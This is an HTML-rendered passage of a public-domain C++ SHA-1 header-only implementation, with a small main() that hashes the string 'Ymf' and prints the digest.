class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">sha1.hpp - source code of</span><br><span class="hljs-comment">============</span><br><span class="hljs-comment">SHA-1 in C++</span><br><span class="hljs-comment">============</span><br><span class="hljs-comment">100% Public Domain.</span><br><span class="hljs-comment">Original C Code</span><br><span class="hljs-comment">-- Steve Reid &lt;steve@edmweb.com&gt;</span><br><span class="hljs-comment">Small changes to fit into bglibs</span><br><span class="hljs-comment">-- Bruce Guenter &lt;bruce@untroubled.org&gt;</span><br><span class="hljs-comment">Translation to simpler C++ Code</span><br><span class="hljs-comment">-- Volker Diels-Grabsch &lt;v@njh.eu&gt;</span><br><span class="hljs-comment">Safety fixes</span><br><span class="hljs-comment">-- Eugene Hopkinson &lt;slowriot at voxelstorm dot com&gt;</span><br><span class="hljs-comment">Header-only library</span><br><span class="hljs-comment">-- Zlatko Michailov &lt;zlatko@michailov.org&gt;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SHA1_HPP</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SHA1_HPP</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdint&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iomanip&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SHA1</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">SHA1</span>();<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string &amp;s)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update</span><span class="hljs-params">(std::istream &amp;is)</span></span>;<br><span class="hljs-function">std::string <span class="hljs-title">final</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> std::string <span class="hljs-title">from_file</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string &amp;filename)</span></span>;<br><br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">uint32_t</span> digest[<span class="hljs-number">5</span>];<br>std::string buffer;<br><span class="hljs-type">uint64_t</span> transforms;<br>&#125;;<br><br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> BLOCK_INTS = <span class="hljs-number">16</span>;  <span class="hljs-comment">/* number of 32bit integers per SHA1 block */</span><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> BLOCK_BYTES = BLOCK_INTS * <span class="hljs-number">4</span>;<br><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">reset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> digest[], std::string &amp;buffer, <span class="hljs-type">uint64_t</span> &amp;transforms)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">/* SHA1 initialization constants */</span><br>digest[<span class="hljs-number">0</span>] = <span class="hljs-number">0x67452301</span>;<br>digest[<span class="hljs-number">1</span>] = <span class="hljs-number">0xefcdab89</span>;<br>digest[<span class="hljs-number">2</span>] = <span class="hljs-number">0x98badcfe</span>;<br>digest[<span class="hljs-number">3</span>] = <span class="hljs-number">0x10325476</span>;<br>digest[<span class="hljs-number">4</span>] = <span class="hljs-number">0xc3d2e1f0</span>;<br><br><span class="hljs-comment">/* Reset counters */</span><br>buffer = <span class="hljs-string">&quot;&quot;</span>;<br>transforms = <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> <span class="hljs-title">rol</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> value, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> bits)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> (value &lt;&lt; bits) | (value &gt;&gt; (<span class="hljs-number">32</span> - bits));<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> <span class="hljs-title">blk</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> block[BLOCK_INTS], <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">rol</span>(block[(i + <span class="hljs-number">13</span>) &amp; <span class="hljs-number">15</span>] ^ block[(i + <span class="hljs-number">8</span>) &amp; <span class="hljs-number">15</span>] ^ block[(i + <span class="hljs-number">2</span>) &amp; <span class="hljs-number">15</span>] ^ block[i], <span class="hljs-number">1</span>);<br>&#125;<br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* (R0+R1), R2, R3, R4 are the different operations used in SHA1</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">R0</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> block[BLOCK_INTS], <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> v, <span class="hljs-type">uint32_t</span> &amp;w, <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> x, <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> y, <span class="hljs-type">uint32_t</span> &amp;z, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>z += ((w&amp;(x^y)) ^ y) + block[i] + <span class="hljs-number">0x5a827999</span> + <span class="hljs-built_in">rol</span>(v, <span class="hljs-number">5</span>);<br>w = <span class="hljs-built_in">rol</span>(w, <span class="hljs-number">30</span>);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">R1</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> block[BLOCK_INTS], <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> v, <span class="hljs-type">uint32_t</span> &amp;w, <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> x, <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> y, <span class="hljs-type">uint32_t</span> &amp;z, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>block[i] = <span class="hljs-built_in">blk</span>(block, i);<br>z += ((w&amp;(x^y)) ^ y) + block[i] + <span class="hljs-number">0x5a827999</span> + <span class="hljs-built_in">rol</span>(v, <span class="hljs-number">5</span>);<br>w = <span class="hljs-built_in">rol</span>(w, <span class="hljs-number">30</span>);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">R2</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> block[BLOCK_INTS], <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> v, <span class="hljs-type">uint32_t</span> &amp;w, <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> x, <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> y, <span class="hljs-type">uint32_t</span> &amp;z, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>block[i] = <span class="hljs-built_in">blk</span>(block, i);<br>z += (w^x^y) + block[i] + <span class="hljs-number">0x6ed9eba1</span> + <span class="hljs-built_in">rol</span>(v, <span class="hljs-number">5</span>);<br>w = <span class="hljs-built_in">rol</span>(w, <span class="hljs-number">30</span>);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">R3</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> block[BLOCK_INTS], <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> v, <span class="hljs-type">uint32_t</span> &amp;w, <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> x, <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> y, <span class="hljs-type">uint32_t</span> &amp;z, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>block[i] = <span class="hljs-built_in">blk</span>(block, i);<br>z += (((w | x)&amp;y) | (w&amp;x)) + block[i] + <span class="hljs-number">0x8f1bbcdc</span> + <span class="hljs-built_in">rol</span>(v, <span class="hljs-number">5</span>);<br>w = <span class="hljs-built_in">rol</span>(w, <span class="hljs-number">30</span>);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">R4</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> block[BLOCK_INTS], <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> v, <span class="hljs-type">uint32_t</span> &amp;w, <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> x, <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> y, <span class="hljs-type">uint32_t</span> &amp;z, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>block[i] = <span class="hljs-built_in">blk</span>(block, i);<br>z += (w^x^y) + block[i] + <span class="hljs-number">0xca62c1d6</span> + <span class="hljs-built_in">rol</span>(v, <span class="hljs-number">5</span>);<br>w = <span class="hljs-built_in">rol</span>(w, <span class="hljs-number">30</span>);<br>&#125;<br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Hash a single 512-bit block. This is the core of the algorithm.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> digest[], <span class="hljs-type">uint32_t</span> block[BLOCK_INTS], <span class="hljs-type">uint64_t</span> &amp;transforms)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">/* Copy digest[] to working vars */</span><br><span class="hljs-type">uint32_t</span> a = digest[<span class="hljs-number">0</span>];<br><span class="hljs-type">uint32_t</span> b = digest[<span class="hljs-number">1</span>];<br><span class="hljs-type">uint32_t</span> c = digest[<span class="hljs-number">2</span>];<br><span class="hljs-type">uint32_t</span> d = digest[<span class="hljs-number">3</span>];<br><span class="hljs-type">uint32_t</span> e = digest[<span class="hljs-number">4</span>];<br><br><span class="hljs-comment">/* 4 rounds of 20 operations each. Loop unrolled. */</span><br><span class="hljs-built_in">R0</span>(block, a, b, c, d, e, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">R0</span>(block, e, a, b, c, d, <span class="hljs-number">1</span>);<br><span class="hljs-built_in">R0</span>(block, d, e, a, b, c, <span class="hljs-number">2</span>);<br><span class="hljs-built_in">R0</span>(block, c, d, e, a, b, <span class="hljs-number">3</span>);<br><span class="hljs-built_in">R0</span>(block, b, c, d, e, a, <span class="hljs-number">4</span>);<br><span class="hljs-built_in">R0</span>(block, a, b, c, d, e, <span class="hljs-number">5</span>);<br><span class="hljs-built_in">R0</span>(block, e, a, b, c, d, <span class="hljs-number">6</span>);<br><span class="hljs-built_in">R0</span>(block, d, e, a, b, c, <span class="hljs-number">7</span>);<br><span class="hljs-built_in">R0</span>(block, c, d, e, a, b, <span class="hljs-number">8</span>);<br><span class="hljs-built_in">R0</span>(block, b, c, d, e, a, <span class="hljs-number">9</span>);<br><span class="hljs-built_in">R0</span>(block, a, b, c, d, e, <span class="hljs-number">10</span>);<br><span class="hljs-built_in">R0</span>(block, e, a, b, c, d, <span class="hljs-number">11</span>);<br><span class="hljs-built_in">R0</span>(block, d, e, a, b, c, <span class="hljs-number">12</span>);<br><span class="hljs-built_in">R0</span>(block, c, d, e, a, b, <span class="hljs-number">13</span>);<br><span class="hljs-built_in">R0</span>(block, b, c, d, e, a, <span class="hljs-number">14</span>);<br><span class="hljs-built_in">R0</span>(block, a, b, c, d, e, <span class="hljs-number">15</span>);<br><span class="hljs-built_in">R1</span>(block, e, a, b, c, d, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">R1</span>(block, d, e, a, b, c, <span class="hljs-number">1</span>);<br><span class="hljs-built_in">R1</span>(block, c, d, e, a, b, <span class="hljs-number">2</span>);<br><span class="hljs-built_in">R1</span>(block, b, c, d, e, a, <span class="hljs-number">3</span>);<br><span class="hljs-built_in">R2</span>(block, a, b, c, d, e, <span class="hljs-number">4</span>);<br><span class="hljs-built_in">R2</span>(block, e, a, b, c, d, <span class="hljs-number">5</span>);<br><span class="hljs-built_in">R2</span>(block, d, e, a, b, c, <span class="hljs-number">6</span>);<br><span class="hljs-built_in">R2</span>(block, c, d, e, a, b, <span class="hljs-number">7</span>);<br><span class="hljs-built_in">R2</span>(block, b, c, d, e, a, <span class="hljs-number">8</span>);<br><span class="hljs-built_in">R2</span>(block, a, b, c, d, e, <span class="hljs-number">9</span>);<br><span class="hljs-built_in">R2</span>(block, e, a, b, c, d, <span class="hljs-number">10</span>);<br><span class="hljs-built_in">R2</span>(block, d, e, a, b, c, <span class="hljs-number">11</span>);<br><span class="hljs-built_in">R2</span>(block, c, d, e, a, b, <span class="hljs-number">12</span>);<br><span class="hljs-built_in">R2</span>(block, b, c, d, e, a, <span class="hljs-number">13</span>);<br><span class="hljs-built_in">R2</span>(block, a, b, c, d, e, <span class="hljs-number">14</span>);<br><span class="hljs-built_in">R2</span>(block, e, a, b, c, d, <span class="hljs-number">15</span>);<br><span class="hljs-built_in">R2</span>(block, d, e, a, b, c, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">R2</span>(block, c, d, e, a, b, <span class="hljs-number">1</span>);<br><span class="hljs-built_in">R2</span>(block, b, c, d, e, a, <span class="hljs-number">2</span>);<br><span class="hljs-built_in">R2</span>(block, a, b, c, d, e, <span class="hljs-number">3</span>);<br><span class="hljs-built_in">R2</span>(block, e, a, b, c, d, <span class="hljs-number">4</span>);<br><span class="hljs-built_in">R2</span>(block, d, e, a, b, c, <span class="hljs-number">5</span>);<br><span class="hljs-built_in">R2</span>(block, c, d, e, a, b, <span class="hljs-number">6</span>);<br><span class="hljs-built_in">R2</span>(block, b, c, d, e, a, <span class="hljs-number">7</span>);<br><span class="hljs-built_in">R3</span>(block, a, b, c, d, e, <span class="hljs-number">8</span>);<br><span class="hljs-built_in">R3</span>(block, e, a, b, c, d, <span class="hljs-number">9</span>);<br><span class="hljs-built_in">R3</span>(block, d, e, a, b, c, <span class="hljs-number">10</span>);<br><span class="hljs-built_in">R3</span>(block, c, d, e, a, b, <span class="hljs-number">11</span>);<br><span class="hljs-built_in">R3</span>(block, b, c, d, e, a, <span class="hljs-number">12</span>);<br><span class="hljs-built_in">R3</span>(block, a, b, c, d, e, <span class="hljs-number">13</span>);<br><span class="hljs-built_in">R3</span>(block, e, a, b, c, d, <span class="hljs-number">14</span>);<br><span class="hljs-built_in">R3</span>(block, d, e, a, b, c, <span class="hljs-number">15</span>);<br><span class="hljs-built_in">R3</span>(block, c, d, e, a, b, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">R3</span>(block, b, c, d, e, a, <span class="hljs-number">1</span>);<br><span class="hljs-built_in">R3</span>(block, a, b, c, d, e, <span class="hljs-number">2</span>);<br><span class="hljs-built_in">R3</span>(block, e, a, b, c, d, <span class="hljs-number">3</span>);<br><span class="hljs-built_in">R3</span>(block, d, e, a, b, c, <span class="hljs-number">4</span>);<br><span class="hljs-built_in">R3</span>(block, c, d, e, a, b, <span class="hljs-number">5</span>);<br><span class="hljs-built_in">R3</span>(block, b, c, d, e, a, <span class="hljs-number">6</span>);<br><span class="hljs-built_in">R3</span>(block, a, b, c, d, e, <span class="hljs-number">7</span>);<br><span class="hljs-built_in">R3</span>(block, e, a, b, c, d, <span class="hljs-number">8</span>);<br><span class="hljs-built_in">R3</span>(block, d, e, a, b, c, <span class="hljs-number">9</span>);<br><span class="hljs-built_in">R3</span>(block, c, d, e, a, b, <span class="hljs-number">10</span>);<br><span class="hljs-built_in">R3</span>(block, b, c, d, e, a, <span class="hljs-number">11</span>);<br><span class="hljs-built_in">R4</span>(block, a, b, c, d, e, <span class="hljs-number">12</span>);<br><span class="hljs-built_in">R4</span>(block, e, a, b, c, d, <span class="hljs-number">13</span>);<br><span class="hljs-built_in">R4</span>(block, d, e, a, b, c, <span class="hljs-number">14</span>);<br><span class="hljs-built_in">R4</span>(block, c, d, e, a, b, <span class="hljs-number">15</span>);<br><span class="hljs-built_in">R4</span>(block, b, c, d, e, a, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">R4</span>(block, a, b, c, d, e, <span class="hljs-number">1</span>);<br><span class="hljs-built_in">R4</span>(block, e, a, b, c, d, <span class="hljs-number">2</span>);<br><span class="hljs-built_in">R4</span>(block, d, e, a, b, c, <span class="hljs-number">3</span>);<br><span class="hljs-built_in">R4</span>(block, c, d, e, a, b, <span class="hljs-number">4</span>);<br><span class="hljs-built_in">R4</span>(block, b, c, d, e, a, <span class="hljs-number">5</span>);<br><span class="hljs-built_in">R4</span>(block, a, b, c, d, e, <span class="hljs-number">6</span>);<br><span class="hljs-built_in">R4</span>(block, e, a, b, c, d, <span class="hljs-number">7</span>);<br><span class="hljs-built_in">R4</span>(block, d, e, a, b, c, <span class="hljs-number">8</span>);<br><span class="hljs-built_in">R4</span>(block, c, d, e, a, b, <span class="hljs-number">9</span>);<br><span class="hljs-built_in">R4</span>(block, b, c, d, e, a, <span class="hljs-number">10</span>);<br><span class="hljs-built_in">R4</span>(block, a, b, c, d, e, <span class="hljs-number">11</span>);<br><span class="hljs-built_in">R4</span>(block, e, a, b, c, d, <span class="hljs-number">12</span>);<br><span class="hljs-built_in">R4</span>(block, d, e, a, b, c, <span class="hljs-number">13</span>);<br><span class="hljs-built_in">R4</span>(block, c, d, e, a, b, <span class="hljs-number">14</span>);<br><span class="hljs-built_in">R4</span>(block, b, c, d, e, a, <span class="hljs-number">15</span>);<br><br><span class="hljs-comment">/* Add the working vars back into digest[] */</span><br>digest[<span class="hljs-number">0</span>] += a;<br>digest[<span class="hljs-number">1</span>] += b;<br>digest[<span class="hljs-number">2</span>] += c;<br>digest[<span class="hljs-number">3</span>] += d;<br>digest[<span class="hljs-number">4</span>] += e;<br><br><span class="hljs-comment">/* Count the number of transformations */</span><br>transforms++;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">buffer_to_block</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string &amp;buffer, <span class="hljs-type">uint32_t</span> block[BLOCK_INTS])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">/* Convert the std::string (byte buffer) to a uint32_t array (MSB) */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; BLOCK_INTS; i++)<br>&#123;<br>block[i] = (buffer[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>] &amp; <span class="hljs-number">0xff</span>)<br>| (buffer[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>] &amp; <span class="hljs-number">0xff</span>) &lt;&lt; <span class="hljs-number">8</span><br>| (buffer[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>] &amp; <span class="hljs-number">0xff</span>) &lt;&lt; <span class="hljs-number">16</span><br>| (buffer[<span class="hljs-number">4</span> * i + <span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xff</span>) &lt;&lt; <span class="hljs-number">24</span>;<br>&#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-title">SHA1::SHA1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">reset</span>(digest, buffer, transforms);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">SHA1::update</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string &amp;s)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">std::istringstream <span class="hljs-title">is</span><span class="hljs-params">(s)</span></span>;<br><span class="hljs-built_in">update</span>(is);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">SHA1::update</span><span class="hljs-params">(std::istream &amp;is)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>&#123;<br><span class="hljs-type">char</span> sbuf[BLOCK_BYTES];<br>is.<span class="hljs-built_in">read</span>(sbuf, BLOCK_BYTES - buffer.<span class="hljs-built_in">size</span>());<br>buffer.<span class="hljs-built_in">append</span>(sbuf, (std::<span class="hljs-type">size_t</span>)is.<span class="hljs-built_in">gcount</span>());<br><span class="hljs-keyword">if</span> (buffer.<span class="hljs-built_in">size</span>() != BLOCK_BYTES)<br>&#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">uint32_t</span> block[BLOCK_INTS];<br><span class="hljs-built_in">buffer_to_block</span>(buffer, block);<br><span class="hljs-built_in">transform</span>(digest, block, transforms);<br>buffer.<span class="hljs-built_in">clear</span>();<br>&#125;<br>&#125;<br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Add padding and return the message digest.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> std::string <span class="hljs-title">SHA1::final</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">/* Total number of hashed bits */</span><br><span class="hljs-type">uint64_t</span> total_bits = (transforms*BLOCK_BYTES + buffer.<span class="hljs-built_in">size</span>()) * <span class="hljs-number">8</span>;<br><br><span class="hljs-comment">/* Padding */</span><br>buffer += (<span class="hljs-type">char</span>)<span class="hljs-number">0x80</span>;<br><span class="hljs-type">size_t</span> orig_size = buffer.<span class="hljs-built_in">size</span>();<br><span class="hljs-keyword">while</span> (buffer.<span class="hljs-built_in">size</span>() &lt; BLOCK_BYTES)<br>&#123;<br>buffer += (<span class="hljs-type">char</span>)<span class="hljs-number">0x00</span>;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> block[BLOCK_INTS];<br><span class="hljs-built_in">buffer_to_block</span>(buffer, block);<br><br><span class="hljs-keyword">if</span> (orig_size &gt; BLOCK_BYTES - <span class="hljs-number">8</span>)<br>&#123;<br><span class="hljs-built_in">transform</span>(digest, block, transforms);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; BLOCK_INTS - <span class="hljs-number">2</span>; i++)<br>&#123;<br>block[i] = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/* Append total_bits, split this uint64_t into two uint32_t */</span><br>block[BLOCK_INTS - <span class="hljs-number">1</span>] = (<span class="hljs-type">uint32_t</span>)total_bits;<br>block[BLOCK_INTS - <span class="hljs-number">2</span>] = (<span class="hljs-type">uint32_t</span>)(total_bits &gt;&gt; <span class="hljs-number">32</span>);<br><span class="hljs-built_in">transform</span>(digest, block, transforms);<br><br><span class="hljs-comment">/* Hex std::string */</span><br>std::ostringstream result;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">sizeof</span>(digest) / <span class="hljs-built_in">sizeof</span>(digest[<span class="hljs-number">0</span>]); i++)<br>&#123;<br>result &lt;&lt; std::hex &lt;&lt; std::<span class="hljs-built_in">setfill</span>(<span class="hljs-string">&#x27;0&#x27;</span>) &lt;&lt; std::<span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>);<br>result &lt;&lt; digest[i];<br>&#125;<br><br><span class="hljs-comment">/* Reset for next run */</span><br><span class="hljs-built_in">reset</span>(digest, buffer, transforms);<br><br><span class="hljs-keyword">return</span> result.<span class="hljs-built_in">str</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> std::string <span class="hljs-title">SHA1::from_file</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string &amp;filename)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function">std::ifstream <span class="hljs-title">stream</span><span class="hljs-params">(filename.c_str(), std::ios::binary)</span></span>;<br>SHA1 checksum;<br>checksum.<span class="hljs-built_in">update</span>(stream);<br><span class="hljs-keyword">return</span> checksum.<span class="hljs-built_in">final</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-comment">/* argc */</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> ** <span class="hljs-comment">/* argv */</span>)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">const</span> std::string input = <span class="hljs-string">&quot;Ymf&quot;</span>;<br><br>SHA1 checksum;<br>checksum.<span class="hljs-built_in">update</span>(input);<br><span class="hljs-type">const</span> std::string hash = checksum.<span class="hljs-built_in">final</span>();<br><br>std::cout &lt;&lt; <span class="hljs-string">&quot;The SHA-1 of \&quot;&quot;</span> &lt;&lt; input &lt;&lt; <span class="hljs-string">&quot;\&quot; is: &quot;</span> &lt;&lt; hash &lt;&lt; std::endl;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* 